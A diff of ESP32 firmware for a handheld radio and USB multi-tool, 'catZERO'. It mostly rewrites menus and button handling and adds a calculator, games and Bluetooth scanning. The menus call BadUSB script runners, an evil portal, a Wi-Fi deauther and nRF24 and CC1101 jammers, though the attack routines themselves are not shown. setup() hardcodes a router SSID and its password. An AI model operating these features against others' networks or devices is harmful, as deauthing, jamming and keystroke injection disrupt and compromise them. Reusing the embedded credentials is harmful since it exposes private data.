-    case STATE_BADUSB_BUILTIN: drawBadUsbBuiltin(); break;
-    case STATE_BADUSB_SD: drawBadUsbSd(); break;
+    case STATE_APPS_MENU: drawAppsMenu(); break;
+    case STATE_APPS_CALCULATOR: drawCalculator(); break;
+    case STATE_APPS_GAME1: drawBirdGame(); break;
+    case STATE_APPS_GAME2: drawTetrisGame(); break;
+    case STATE_BLUETOOTH_SCAN: drawBluetoothScan(); break;
+    case STATE_BLUETOOTH_MENU: drawBluetoothMenu(); break;
     case STATE_LED_SELECT_DEVICE: drawLedSelectDevice(); break;
     case STATE_LED_MAIN_MENU: drawLedMainMenu(); break;
-    case STATE_LED_DEVICE_MENU: drawLedDeviceMenu(); break;
-    case STATE_LED_COLOR: drawLedColor(); break;
     case STATE_LED_COLOR_MENU: drawLedColorMenu(); break;
     case STATE_LED_EFFECT_MENU: drawLedEffectMenu(); break;
-    case STATE_LED_EFFECT: drawLedEffect(); break;
-    case STATE_LED_TIMEOUT: drawLedTimeout(); break;
-    case STATE_LED_MENU: drawLedMenu(); break;
+    case STATE_LED_BRIGHTNESS_MENU: drawLedBrightnessMenu(); break;
+    case STATE_LED_TIMEOUT_MENU: drawLedTimeoutMenu(); break;
     case STATE_STORAGE_INFO: drawStorageInfo(); break;
     case STATE_MAIN_MENU: drawMainMenu(); break;
     case STATE_WIFI_MENU: drawWifiMenu(); break;
@@ -4095,28 +5029,34 @@ void updateDisplay() {
     case STATE_CC1101_JAMMER: drawCc1101Jammer(); break;
     case STATE_CC1101_CAPTURE: drawCc1101Capture(); break;
     case STATE_CC1101_TRANSMIT: drawCc1101Transmit(); break;
+    case STATE_BADUSB_MENU: drawBadUsbMenu(); break;
+    case STATE_BADUSB_BUILTIN: drawBadUsbBuiltin(); break;
+    case STATE_BADUSB_SD: drawBadUsbSd(); break;
+    case STATE_EVIL_PORTAL: drawEvilPortalStatus(); break;
+    case STATE_DEAUTHER: drawDeautherStatus(); break;
+    case STATE_NRF_ENHANCED: drawNrfEnhancedStatus(jamMode, 0); break;
     default: break;
   }
   needRedraw = false;
 }
 
-// ----------------------------------------------------------------------------
-// SETUP
-// ----------------------------------------------------------------------------
+// ==================== SETUP ====================
 void setup() {
   delay(500);
   deviceBootTime = millis();
   lastActivityTime = millis();
   Serial.begin(115200);
   Serial.println("\ncatZERO v3.0 Starting");
+  BLEDevice::init("catZERO");
   debugPrint("Setup begin");
-    // USB HID для BadUSB
-   // USB HID для BadUSB
+  pref.begin("battery", true);
+  batteryRemaining = pref.getFloat("remaining", batteryCapacity);
+  pref.end();
+  pinMode(CHARGE_PIN, INPUT);
   USB.begin();
   Keyboard.begin();
   Serial.println("USB HID ready");
-  ledcSetup(0, 5000, 8);
-  ledcAttachPin(48, 0);
+  BLEDevice::init("catZERO");
   led_board.begin();
   led_board.show();
   led_keyboard.begin();
@@ -4124,26 +5064,33 @@ void setup() {
   led_board.setBrightness(led_board_brightness);
   led_keyboard.setBrightness(led_keyboard_brightness);
   loadLedSettings();
+
+  // Инициализация Tetris
+  randomSeed(analogRead(0));
+  spawnPiece();
+
   Wire.begin(OLED_SDA, OLED_SCL);
-if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
+  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
     Serial.println("OLED ERROR");
-}
-else {
+  } else {
     Serial.println("OLED OK");
-}
+  }
   display.setTextWrap(false);
   display.setTextColor(SSD1306_WHITE);
   showBootLogo();
   debugPrint("Display initialized");
+
   pinMode(BTN_ANALOG_PIN, INPUT);
   analogSetPinAttenuation(BTN_ANALOG_PIN, ADC_11db);
   loadTimeout();
   debugPrint("Timeout loaded");
   pinMode(RESET_BTN_PIN, INPUT_PULLUP);
   pinMode(10, INPUT_PULLUP);
+
   WiFi.mode(WIFI_OFF);
   delay(100);
   debugPrint("WiFi mode set to OFF");
+
   SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, RF_CSN_PIN);
   SPI.setFrequency(8000000);
   debugPrint("SPI started");
@@ -4157,6 +5104,7 @@ else {
     Serial.println("nRF24 FAIL");
   }
   for (int i = 0; i < 32; i++) jamNoise[i] = random(256);
+
   SPI.begin(CC_SCK_PIN, CC_MISO_PIN, CC_MOSI_PIN, CC_CSN_PIN);
   ELECHOUSE_cc1101.setSpiPin(CC_SCK_PIN, CC_MISO_PIN, CC_MOSI_PIN, CC_CSN_PIN);
   if (ELECHOUSE_cc1101.getCC1101()) {
@@ -4182,6 +5130,7 @@ else {
     Serial.println("CC1101 not found");
     showMsg("CC1101 ERROR");
   }
+
   irRx = new IRrecv(IR_RX_PIN);
   irRx->enableIRIn();
   irRxOk = true;
@@ -4190,9 +5139,11 @@ else {
   for (int i = 0; i < IR_SLOTS_COUNT; i++) irSlots[i].isValid = false;
   loadIrSlots();
   debugPrint("IR initialized");
+
   EEPROM.begin(EEPROM_SIZE_BYTES);
   LittleFS.begin(true);
   debugPrint("LittleFS mounted");
+
   loadWiFiCredentials();
   const char* presetSSID[] = {"FRITZ!Box 6591 Cabel MK", "moto e13", "", "", ""};
   const char* presetPASS[] = {"43481208496765148415", "12345678", "", "", ""};
@@ -4212,6 +5163,7 @@ else {
     }
   }
   loadWiFiCredentials();
+
   memset(nrfSmooth, 0, sizeof(nrfSmooth));
   memset(nrf_spectrum_history, 0, sizeof(nrf_spectrum_history));
   memset(wifiSmooth, 0, sizeof(wifiSmooth));
@@ -4271,9 +5223,7 @@ else {
   Serial.println("===================================\n");
 }
 
-// ----------------------------------------------------------------------------
-// LOOP (ИСПРАВЛЕННЫЙ)
-// ----------------------------------------------------------------------------
+// ==================== LOOP ====================
 void loop() {
   handleButtons();
   bool up = btnUp();
@@ -4284,6 +5234,7 @@ void loop() {
   if (down && !lastDown) debugButton("DOWN");
   if (ok && !lastOk) debugButton("OK");
   lastUp = up; lastDown = down; lastOk = ok;
+
   static bool lastResetState = HIGH;
   static unsigned long resetPressStart = 0;
   static bool resetLongPressTriggered = false;
@@ -4299,6 +5250,7 @@ void loop() {
     ESP.restart();
   }
   lastResetState = resetState;
+
   if (!displayOn && (up || down || ok)) {
     setPower(true);
     lastActivityTime = millis();
@@ -4310,6 +5262,8 @@ void loop() {
     lastActivityTime = millis();
     needRedraw = true;
   }
+
+  // Автоподключение к WiFi
   if (autoConnectScheduled && millis() >= autoConnectTime) {
     autoConnectScheduled = false;
     Serial.println("Auto-connect timer triggered");
@@ -4326,6 +5280,8 @@ void loop() {
       else Serial.println("Already connected to a saved network");
     } else Serial.println("No saved networks");
   }
+
+  // Обработка подключения к WiFi
   if (appState == STATE_WIFI_CONNECTING) {
     if (connectInProgress) {
       if (WiFi.status() == WL_CONNECTED) {
@@ -4352,6 +5308,10 @@ void loop() {
     delay(5);
     return;
   }
+
+  isCharging = digitalRead(CHARGE_PIN) == HIGH;
+
+  // WiFi чат
   if (appState == STATE_WIFI_CHAT && !chatActive && WiFi.status() == WL_CONNECTED) {
     startWiFiChat();
     chatKeyboardActive = false;
@@ -4362,6 +5322,7 @@ void loop() {
     chatKeyboardActive = false;
     webSocketConnected = false;
   }
+
   if (appState == STATE_WIFI_CHAT && chatActive) {
     server.handleClient();
     webSocket.loop();
@@ -4375,14 +5336,14 @@ void loop() {
       display.setCursor(25, 43);
       display.print("UP=Yes  DOWN=No");
       display.display();
-      if (btnUp()) {
+      if (up) {
         appState = STATE_WIFI_MENU;
         needRedraw = true;
         confirmExit = false;
         chatKeyboardActive = false;
         stopWiFiChat();
         delay(200);
-      } else if (btnDown()) {
+      } else if (down) {
         confirmExit = false;
         needRedraw = true;
         delay(200);
@@ -4390,7 +5351,7 @@ void loop() {
       return;
     }
     if (!chatKeyboardActive) {
-      if (btnOk()) {
+      if (ok) {
         if (!longPressFlag) {
           longPressStart = millis();
           longPressFlag = true;
@@ -4413,7 +5374,7 @@ void loop() {
       static unsigned long lastMoveTime = 0;
       static bool leftHeld = false, rightHeld = false;
       static bool okProcessed = false;
-      if (btnUp()) {
+      if (up) {
         if (!leftHeld) {
           leftHeld = true; lastMoveTime = millis();
           selectedKey = (selectedKey - 1 + totalKeys) % totalKeys;
@@ -4424,7 +5385,7 @@ void loop() {
           needRedraw = true;
         }
       } else leftHeld = false;
-      if (btnDown()) {
+      if (down) {
         if (!rightHeld) {
           rightHeld = true; lastMoveTime = millis();
           selectedKey = (selectedKey + 1) % totalKeys;
@@ -4435,7 +5396,7 @@ void loop() {
           needRedraw = true;
         }
       } else rightHeld = false;
-      if (btnOk() && !okProcessed) {
+      if (ok && !okProcessed) {
         okProcessed = true;
         String key = capsLock ? upperKeys[selectedKey] : lowerKeys[selectedKey];
         if (key == "Caps") {
@@ -4468,78 +5429,162 @@ void loop() {
         }
         delay(150);
       }
-      if (!btnOk()) okProcessed = false;
+      if (!ok) okProcessed = false;
     }
     if (needRedraw && displayOn) updateDisplay();
     delay(5);
     return;
   }
+
+  // Обновление батареи
   if (millis() - lastBatteryUpdate >= 1000) {
     float used = estimatedCurrentMA / 3600.0;
     batteryRemaining -= used;
     if (batteryRemaining < 0) batteryRemaining = 0;
     lastBatteryUpdate = millis();
     needRedraw = true;
+    pref.begin("battery", false);
+    pref.putFloat("remaining", batteryRemaining);
+    pref.end();
   }
+
+  // ============================================================
+  // НОВАЯ ОБРАБОТКА СОСТОЯНИЙ ДЛЯ ИГР И КАЛЬКУЛЯТОРА
+  // ============================================================
+  if (appState == STATE_APPS_GAME1 || appState == STATE_APPS_GAME2 || appState == STATE_APPS_CALCULATOR) {
+if (appState == STATE_APPS_CALCULATOR) {
+  static unsigned long lastCalcMove = 0;
+  static bool moveHeld = false;
+  
+  if (btnUp()) {
+    if (!moveHeld) {
+      calcSelectedKey = (calcSelectedKey - 1 + calcKeysCount) % calcKeysCount;
+      needRedraw = true;
+      moveHeld = true;
+      lastCalcMove = millis();
+    } else if (millis() - lastCalcMove > 200) {
+      calcSelectedKey = (calcSelectedKey - 1 + calcKeysCount) % calcKeysCount;
+      needRedraw = true;
+      lastCalcMove = millis();
+    }
+  } else {
+    moveHeld = false;
+  }
+  
+  if (btnDown()) {
+    if (!moveHeld) {
+      calcSelectedKey = (calcSelectedKey + 1) % calcKeysCount;
+      needRedraw = true;
+      moveHeld = true;
+      lastCalcMove = millis();
+    } else if (millis() - lastCalcMove > 200) {
+      calcSelectedKey = (calcSelectedKey + 1) % calcKeysCount;
+      needRedraw = true;
+      lastCalcMove = millis();
+    }
+  } else {
+    moveHeld = false;
+  }
+  
+  if (btnOk()) {
+    String key = calcKeyLabels[calcSelectedKey];
+    if (key == "=") {
+      calcResult = evaluateExpression(calcExpression);
+      needRedraw = true;
+    } else if (key == "C") {
+      calcExpression = "";
+      calcResult = "";
+      needRedraw = true;
+    } else if (key == "Del") {
+      if (calcExpression.length() > 0) calcExpression.remove(calcExpression.length()-1);
+      needRedraw = true;
+    } else if (key == "Exit") {
+      appState = STATE_APPS_MENU;
+      needRedraw = true;
+    } else {
+      calcExpression += key;
+      needRedraw = true;
+    }
+    delay(150);
+  }
+}
+    if (needRedraw && displayOn) updateDisplay();
+    delay(5);
+    return;
+  }
+
+  // ============================================================
+  // ОБЩАЯ ОБРАБОТКА КНОПОК ДЛЯ ОСТАЛЬНЫХ СОСТОЯНИЙ (МЕНЮ)
+  // ============================================================
   if (appState != STATE_CONSOLE && appState != STATE_CONSOLE_COMMAND_OUTPUT) {
+    // Обработка нажатий для всех меню (кроме консоли и игр)
     if (up) {
       switch (appState) {
-                case STATE_BADUSB_MENU:
-            badUsbMenuIdx = (badUsbMenuIdx - 1 + 3) % 3;
-            needRedraw = true;
-            break;
-case STATE_BADUSB_BUILTIN:
-    badUsbBuiltinIdx--;
-    if (badUsbBuiltinIdx < 0) badUsbBuiltinIdx = badUsbBuiltinCount; // +1 для Back
+        // ---- Главное меню ----
+        case STATE_MAIN_MENU:
+          mainIdx--;
+          if (mainIdx < 0) mainIdx = MAIN_SIZE_TOTAL - 1;
+          if (mainIdx < mainScrollOffset) mainScrollOffset = mainIdx;
+          needRedraw = true;
+          break;
+
+        // ---- Меню Apps ----
+        case STATE_APPS_MENU:
+    appsMenuIdx--;
+    if (appsMenuIdx < 0) appsMenuIdx = 4;
     needRedraw = true;
-    break;
-case STATE_BADUSB_SD:
-    badUsbFileIdx--;
-    if (badUsbFileIdx < 0) badUsbFileIdx = badUsbFileList.size(); // +1 для Back
-    needRedraw = true;
-    break;
+          break;
+
+        // ---- Bluetooth ----
+        case STATE_BLUETOOTH_SCAN:
+          bleSelectedIdx--;
+          if (bleSelectedIdx < 0) bleSelectedIdx = bleDevices.empty() ? 0 : bleDevices.size() - 1;
+          needRedraw = true;
+          break;
+        case STATE_BLUETOOTH_MENU:
+          bluetoothMenuIdx = (bluetoothMenuIdx - 1 + 2) % 2;
+          needRedraw = true;
+          break;
+
+        // ---- LED ----
         case STATE_LED_SELECT_DEVICE:
           led_submenu_idx = (led_submenu_idx - 1 + 3) % 3;
           needRedraw = true;
           break;
         case STATE_LED_MAIN_MENU:
-          led_submenu_idx = (led_submenu_idx - 1 + 4) % 4;
+          led_submenu_idx = (led_submenu_idx - 1 + 5) % 5;
           needRedraw = true;
           break;
-case STATE_LED_COLOR_MENU:
-  if (led_color_edit_mode) {
-    if (led_editing_param == 0) {
-      // Меняем цвет
-      led_color_effect_selection = (led_color_effect_selection - 1 + numColors) % numColors;
-      if (led_selected_device) led_keyboard_colorIdx = led_color_effect_selection;
-      else led_board_colorIdx = led_color_effect_selection;
-    } else {
-      // Меняем яркость
-      int *bright = led_selected_device ? &led_keyboard_brightness : &led_board_brightness;
-      *bright = constrain(*bright + 5, 0, 255);
-    }
-  } else {
-    // Перемещаем выбор между "Color" и "Brightness"
-    led_submenu_idx = (led_submenu_idx - 1 + 2) % 2;
-  }
-  needRedraw = true;
-  break;
+        case STATE_LED_COLOR_MENU:
+          {
+            int *colorIdx = led_selected_device ? &led_keyboard_colorIdx : &led_board_colorIdx;
+            *colorIdx = (*colorIdx - 1 + numColors) % numColors;
+            needRedraw = true;
+          }
+          break;
+        case STATE_LED_EFFECT_MENU:
+          {
+            int *effect = led_selected_device ? &led_keyboard_effect : &led_board_effect;
+            *effect = (*effect - 1 + numEffects) % numEffects;
+            needRedraw = true;
+          }
+          break;
+        case STATE_LED_BRIGHTNESS_MENU:
+          {
+            int *bright = led_selected_device ? &led_keyboard_brightness : &led_board_brightness;
+            *bright = constrain(*bright + 5, 0, 100);
+            needRedraw = true;
+          }
+          break;
+        case STATE_LED_TIMEOUT_MENU:
+          {
+            int *timeout = led_selected_device ? &led_keyboard_timeout : &led_board_timeout;
+            *timeout = (*timeout - 1 + 61) % 61;
+            needRedraw = true;
+          }
+          break;
 
-case STATE_LED_EFFECT_MENU:
-  // Перемещаемся по эффектам (с прокруткой)
-  led_color_effect_selection--;
-  if (led_color_effect_selection < 0) led_color_effect_selection = numEffects - 1;
-  if (led_selected_device) led_keyboard_effect = led_color_effect_selection;
-  else led_board_effect = led_color_effect_selection;
-  needRedraw = true;
-  break;
-
-case STATE_MAIN_MENU:
-  mainIdx--;
-  if (mainIdx < 0) mainIdx = MAIN_SIZE_TOTAL - 1;
-  if (mainIdx < mainScrollOffset) mainScrollOffset = mainIdx;
-  needRedraw = true;
-  break;
+        // ---- WiFi ----
         case STATE_WIFI_MENU:
           wifiMenuIdx--;
           if (wifiMenuIdx < 0) wifiMenuIdx = WIFI_MENU_SIZE - 1;
@@ -4555,11 +5600,15 @@ case STATE_MAIN_MENU:
           if (wifiActionIdx < 0) wifiActionIdx = WIFI_ACTIONS_SIZE - 1;
           needRedraw = true;
           break;
+
+        // ---- nRF24 ----
         case STATE_NRF24_MENU:
           nrfMenuIdx--;
           if (nrfMenuIdx < 0) nrfMenuIdx = NRF_MENU_SIZE - 1;
           needRedraw = true;
           break;
+
+        // ---- IR ----
         case STATE_IR_MENU:
           irMenuIdx--;
           if (irMenuIdx < 0) irMenuIdx = IR_MENU_SIZE - 1;
@@ -4570,6 +5619,8 @@ case STATE_MAIN_MENU:
           if (irTxScroll < 0) irTxScroll = IR_SLOTS_COUNT;
           needRedraw = true;
           break;
+
+        // ---- Settings ----
         case STATE_SETTINGS_MENU:
           settingsIdx--;
           if (settingsIdx < 0) settingsIdx = SETTINGS_SIZE - 1;
@@ -4580,69 +5631,89 @@ case STATE_MAIN_MENU:
           if (timeoutVal < 0) timeoutVal = 300;
           needRedraw = true;
           break;
+
+        // ---- CC1101 ----
         case STATE_CC1101_MENU:
           cc1101_menu_idx--;
           if (cc1101_menu_idx < 0) cc1101_menu_idx = 5;
           needRedraw = true;
           break;
-        default:
+
+        // ---- BadUSB ----
+        case STATE_BADUSB_BUILTIN:
+          badUsbBuiltinIdx--;
+          if (badUsbBuiltinIdx < 0) badUsbBuiltinIdx = badUsbBuiltinCount;
+          needRedraw = true;
           break;
+        case STATE_BADUSB_SD:
+          badUsbFileIdx--;
+          if (badUsbFileIdx < 0) badUsbFileIdx = badUsbFileList.size();
+          needRedraw = true;
+          break;
+
+        default: break;
       }
       delay(150);
     }
+
     if (down) {
       switch (appState) {
-                case STATE_BADUSB_MENU:
-            badUsbMenuIdx = (badUsbMenuIdx + 1) % 3;
-            needRedraw = true;
-            break;
-case STATE_BADUSB_BUILTIN:
-    badUsbBuiltinIdx--;
-    if (badUsbBuiltinIdx < 0) badUsbBuiltinIdx = badUsbBuiltinCount; // +1 для Back
+        case STATE_MAIN_MENU:
+          mainIdx++;
+          if (mainIdx >= MAIN_SIZE_TOTAL) mainIdx = 0;
+          if (mainIdx >= mainScrollOffset + MAIN_VISIBLE) mainScrollOffset = mainIdx - MAIN_VISIBLE + 1;
+          needRedraw = true;
+          break;
+        case STATE_APPS_MENU:
+    appsMenuIdx++;
+    if (appsMenuIdx > 4) appsMenuIdx = 0;
     needRedraw = true;
-    break;
-case STATE_BADUSB_SD:
-    badUsbFileIdx--;
-    if (badUsbFileIdx < 0) badUsbFileIdx = badUsbFileList.size(); // +1 для Back
-    needRedraw = true;
-    break;
+          break;
+        case STATE_BLUETOOTH_SCAN:
+          bleSelectedIdx++;
+          if (bleSelectedIdx >= (int)bleDevices.size()) bleSelectedIdx = 0;
+          needRedraw = true;
+          break;
+        case STATE_BLUETOOTH_MENU:
+          bluetoothMenuIdx = (bluetoothMenuIdx + 1) % 2;
+          needRedraw = true;
+          break;
         case STATE_LED_SELECT_DEVICE:
           led_submenu_idx = (led_submenu_idx + 1) % 3;
           needRedraw = true;
           break;
         case STATE_LED_MAIN_MENU:
-          led_submenu_idx = (led_submenu_idx + 1) % 4;
+          led_submenu_idx = (led_submenu_idx + 1) % 5;
           needRedraw = true;
           break;
-case STATE_LED_COLOR_MENU:
-  if (led_color_edit_mode) {
-    if (led_editing_param == 0) {
-      led_color_effect_selection = (led_color_effect_selection + 1) % numColors;
-      if (led_selected_device) led_keyboard_colorIdx = led_color_effect_selection;
-      else led_board_colorIdx = led_color_effect_selection;
-    } else {
-      int *bright = led_selected_device ? &led_keyboard_brightness : &led_board_brightness;
-      *bright = constrain(*bright - 5, 0, 255);
-    }
-  } else {
-    led_submenu_idx = (led_submenu_idx + 1) % 2;
-  }
-  needRedraw = true;
-  break;
-
-case STATE_LED_EFFECT_MENU:
-  led_color_effect_selection++;
-  if (led_color_effect_selection >= numEffects) led_color_effect_selection = 0;
-  if (led_selected_device) led_keyboard_effect = led_color_effect_selection;
-  else led_board_effect = led_color_effect_selection;
-  needRedraw = true;
-  break;
-case STATE_MAIN_MENU:
-  mainIdx++;
-  if (mainIdx >= MAIN_SIZE_TOTAL) mainIdx = 0;
-  if (mainIdx >= mainScrollOffset + MAIN_VISIBLE) mainScrollOffset = mainIdx - MAIN_VISIBLE + 1;
-  needRedraw = true;
-  break;
+        case STATE_LED_COLOR_MENU:
+          {
+            int *colorIdx = led_selected_device ? &led_keyboard_colorIdx : &led_board_colorIdx;
+            *colorIdx = (*colorIdx + 1) % numColors;
+            needRedraw = true;
+          }
+          break;
+        case STATE_LED_EFFECT_MENU:
+          {
+            int *effect = led_selected_device ? &led_keyboard_effect : &led_board_effect;
+            *effect = (*effect + 1) % numEffects;
+            needRedraw = true;
+          }
+          break;
+        case STATE_LED_BRIGHTNESS_MENU:
+          {
+            int *bright = led_selected_device ? &led_keyboard_brightness : &led_board_brightness;
+            *bright = constrain(*bright - 5, 0, 100);
+            needRedraw = true;
+          }
+          break;
+        case STATE_LED_TIMEOUT_MENU:
+          {
+            int *timeout = led_selected_device ? &led_keyboard_timeout : &led_board_timeout;
+            *timeout = (*timeout + 1) % 61;
+            needRedraw = true;
+          }
+          break;
         case STATE_WIFI_MENU:
           wifiMenuIdx++;
           if (wifiMenuIdx >= WIFI_MENU_SIZE) wifiMenuIdx = 0;
@@ -4688,380 +5759,386 @@ case STATE_MAIN_MENU:
           if (cc1101_menu_idx > 5) cc1101_menu_idx = 0;
           needRedraw = true;
           break;
-        default:
+        case STATE_BADUSB_BUILTIN:
+          badUsbBuiltinIdx++;
+          if (badUsbBuiltinIdx > badUsbBuiltinCount) badUsbBuiltinIdx = 0;
+          needRedraw = true;
           break;
+        case STATE_BADUSB_SD:
+          badUsbFileIdx++;
+          if (badUsbFileIdx > (int)badUsbFileList.size()) badUsbFileIdx = 0;
+          needRedraw = true;
+          break;
+        default: break;
       }
       delay(150);
     }
-if (ok) {
-  switch (appState) {
-    // ==================== ГЛАВНОЕ МЕНЮ ====================
-    case STATE_MAIN_MENU:
-      switch (mainIdx) {
-        case 0: appState = STATE_WIFI_MENU; wifiMenuIdx = 0; break;
-        case 1: appState = STATE_NRF24_MENU; nrfMenuIdx = 0; break;
-        case 2: appState = STATE_IR_MENU; irMenuIdx = 0; break;
-        case 3: appState = STATE_CONSOLE; consoleMode = CONSOLE_KEYBOARD; selectedKey = 0; capsLock = false; consoleText = ""; drawKeyboard(); break;
-        case 4: appState = STATE_BADUSB_MENU; badUsbMenuIdx = 0; break;   // BadUSB
-        case 5: appState = STATE_SETTINGS_MENU; settingsIdx = 0; break;
-        case 6: appState = STATE_CC1101_MENU; cc1101_menu_idx = 0; break;
-        case 7: appState = STATE_STORAGE_INFO; break;
-      }
-      needRedraw = true;
-      break;
 
-    // ==================== BADUSB ====================
-    case STATE_BADUSB_MENU:
-      if (badUsbMenuIdx == 0) {
-        appState = STATE_BADUSB_BUILTIN;
-        badUsbBuiltinIdx = 0;
-      } else if (badUsbMenuIdx == 1) {
-        badUsbFileList.clear();
-        badUsbFileIdx = 0;
-        appState = STATE_BADUSB_SD;
-      } else {
-        appState = STATE_MAIN_MENU;
-      }
-      needRedraw = true;
-      break;
-
-case STATE_BADUSB_BUILTIN:
-    if (badUsbBuiltinIdx == badUsbBuiltinCount) {
-        appState = STATE_BADUSB_MENU;  // выбрали Back
-    } else {
-        badUsbRunBuiltin(badUsbBuiltinIdx);
-    }
-    needRedraw = true;
-    break;
-
-case STATE_BADUSB_SD:
-    if (badUsbFileIdx == (int)badUsbFileList.size()) {
-        appState = STATE_BADUSB_MENU;  // выбрали Back
-    } else if (!badUsbFileList.empty()) {
-        badUsbRunFile(badUsbFileList[badUsbFileIdx]);
-    }
-    needRedraw = true;
-    break;
-    // ==================== LED ====================
-    case STATE_LED_SELECT_DEVICE:
-      if (led_submenu_idx == 0) led_selected_device = 0;
-      else if (led_submenu_idx == 1) led_selected_device = 1;
-      else { appState = STATE_SETTINGS_MENU; break; }
-      appState = STATE_LED_MAIN_MENU;
-      led_submenu_idx = 0;
-      needRedraw = true;
-      break;
-
-    case STATE_LED_MAIN_MENU:
-      if (led_submenu_idx == 0) {
-        appState = STATE_LED_COLOR_MENU;
-        led_color_edit_mode = false;
-      } else if (led_submenu_idx == 1) {
-        appState = STATE_LED_EFFECT_MENU;
-      } else if (led_submenu_idx == 2) {
-        int *timeout = led_selected_device ? &led_keyboard_timeout : &led_board_timeout;
-        *timeout = (*timeout + 10) % 61;
-        saveLedSettings();
-        needRedraw = true;
-        break;
-      } else {
-        appState = STATE_LED_SELECT_DEVICE;
-      }
-      needRedraw = true;
-      break;
-
-    case STATE_LED_COLOR_MENU:
-      if (led_color_edit_mode) {
-        saveLedSettings();
-        led_color_edit_mode = false;
-        appState = STATE_LED_MAIN_MENU;
-      } else {
-        led_color_edit_mode = true;
-        led_editing_param = led_submenu_idx;
-        if (led_editing_param == 0) {
-          led_color_effect_selection = led_selected_device ? led_keyboard_colorIdx : led_board_colorIdx;
-        }
-      }
-      needRedraw = true;
-      break;
-
-    case STATE_LED_EFFECT_MENU:
-      if (led_selected_device) led_keyboard_effect = led_color_effect_selection;
-      else led_board_effect = led_color_effect_selection;
-      saveLedSettings();
-      appState = STATE_LED_MAIN_MENU;
-      needRedraw = true;
-      break;
-
-    case STATE_LED_TIMEOUT_MENU:
-      saveLedSettings();
-      appState = STATE_LED_MAIN_MENU;
-      needRedraw = true;
-      break;
-
-    // ==================== STORAGE ====================
-    case STATE_STORAGE_INFO:
-      appState = STATE_MAIN_MENU;
-      needRedraw = true;
-      break;
-
-    // ==================== WI-FI ====================
-    case STATE_WIFI_MENU:
-      switch (wifiMenuIdx) {
-        case 0: startWifiScan(); appState = STATE_WIFI_SCAN; break;
-        case 1: appState = STATE_WIFI_SPECTRUM; wifiSpectrumActive = true; break;
-        case 2: appState = STATE_WIFI_CHAT; break;
-        case 3: appState = STATE_MAIN_MENU; break;
-      }
-      needRedraw = true;
-      break;
-
-    case STATE_WIFI_SCAN:
-      if (wifiSelectedIdx == -1) {
-        appState = STATE_WIFI_MENU;
-      } else if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size()) {
-        appState = STATE_WIFI_INFO;
-      }
-      needRedraw = true;
-      break;
-
-    case STATE_WIFI_SPECTRUM:
-      appState = STATE_WIFI_MENU;
-      wifiSpectrumActive = false;
-      needRedraw = true;
-      break;
-
-    case STATE_WIFI_ACTIONS:
-      switch (wifiActionIdx) {
-        case 0:
-          if (wifiList.size() > 0 && wifiSelectedIdx >= 0) appState = STATE_WIFI_INFO;
-          else showMsg("No network selected");
-          break;
-        case 1:
-          if (wifiList.size() > 0 && wifiSelectedIdx >= 0) {
-            deauthActive = !deauthActive;
-            if (deauthActive) showMsg("Deauth started");
-            else showMsg("Deauth stopped");
-          } else showMsg("Select network first");
-          break;
-        case 2:
-          deauthActive = false;
-          showMsg("Deauth stopped");
-          break;
-        case 3:
-          if (wifiList.size() > 0 && wifiSelectedIdx >= 0) {
-            String ssid = wifiList[wifiSelectedIdx].ssid;
-            String pwd = inputStringWithKeyboard(true, "Enter password:");
-            if (pwd.length() > 0) {
-              connectSsid = ssid;
-              connectPassword = pwd;
-              connectInProgress = true;
-              connectStartTime = millis();
-              WiFi.begin(ssid.c_str(), pwd.c_str());
-              appState = STATE_WIFI_CONNECTING;
-            }
-          } else showMsg("Select network first");
-          break;
-        case 4: {
-          String ssid = inputStringWithKeyboard(true, "SSID:");
-          if (ssid.length() > 0) {
-            String pwd = inputStringWithKeyboard(true, "Password:");
-            saveWiFiCredentials(ssid, pwd);
-            showMsg("Saved");
+    if (ok) {
+      switch (appState) {
+        case STATE_MAIN_MENU:
+          // Порядок пунктов: WiFi, Bluetooth, nRF24, IR, Console, BadUSB, Settings, CC1101, Storage, Apps
+          switch (mainIdx) {
+            case 0: appState = STATE_WIFI_MENU; wifiMenuIdx = 0; break;
+            case 1: appState = STATE_BLUETOOTH_MENU; bluetoothMenuIdx = 0; break;
+            case 2: appState = STATE_NRF24_MENU; nrfMenuIdx = 0; break;
+            case 3: appState = STATE_IR_MENU; irMenuIdx = 0; break;
+            case 4: appState = STATE_CONSOLE; consoleMode = CONSOLE_KEYBOARD; selectedKey = 0; capsLock = false; consoleText = ""; drawKeyboard(); break;
+            case 5: appState = STATE_BADUSB_MENU; badUsbMenuIdx = 0; break;
+            case 6: appState = STATE_SETTINGS_MENU; settingsIdx = 0; break;
+            case 7: appState = STATE_CC1101_MENU; cc1101_menu_idx = 0; break;
+            case 8: appState = STATE_STORAGE_INFO; break;   // Storage (бывший Search)
+            case 9: appState = STATE_APPS_MENU; appsMenuIdx = 0; break; // Apps
           }
-          break;
-        }
-        case 5:
-          disconnectWiFi();
-          break;
-        case 6:
-          appState = STATE_WIFI_MENU;
-          break;
-      }
-      needRedraw = true;
-      break;
-
-    case STATE_WIFI_INFO:
-      appState = STATE_WIFI_SCAN;
-      needRedraw = true;
-      break;
-
-    // ==================== nRF24 ====================
-    case STATE_NRF24_MENU:
-      switch (nrfMenuIdx) {
-        case 0: appState = STATE_NRF24_SPECTRUM; break;
-        case 1: appState = STATE_NRF24_JAMMER; break;
-        case 2: recheckNRF24(); appState = STATE_NRF24_MENU; break;
-        case 3: appState = STATE_MAIN_MENU; break;
-      }
-      needRedraw = true;
-      break;
-
-    case STATE_NRF24_SPECTRUM:
-      appState = STATE_NRF24_MENU;
-      needRedraw = true;
-      break;
-
-    case STATE_NRF24_JAMMER:
-      if (jamming) stopJammer();
-      else startJammer();
-      needRedraw = true;
-      break;
-
-    // ==================== IR ====================
-    case STATE_IR_MENU:
-      switch (irMenuIdx) {
-        case 0:
-          irCapturing = true;
-          irTempReady = false;
-          irTimeout = millis() + 10000;
-          appState = STATE_IR_CAPTURE;
-          break;
-        case 1:
-          irTxScroll = 0;
-          appState = STATE_IR_TRANSMIT;
-          break;
-        case 2:
-          eraseAllIrSlots();
           needRedraw = true;
           break;
-        case 3:
-          tvbgone_menu();
+
+        case STATE_APPS_MENU:
+    switch (appsMenuIdx) {
+      case 0: appState = STATE_APPS_CALCULATOR; break;
+      case 1: appState = STATE_APPS_GAME1; break;
+      case 2: appState = STATE_APPS_GAME2; break;
+      case 3: runWikipedia(); break;
+      case 4: appState = STATE_MAIN_MENU; break;
+    }
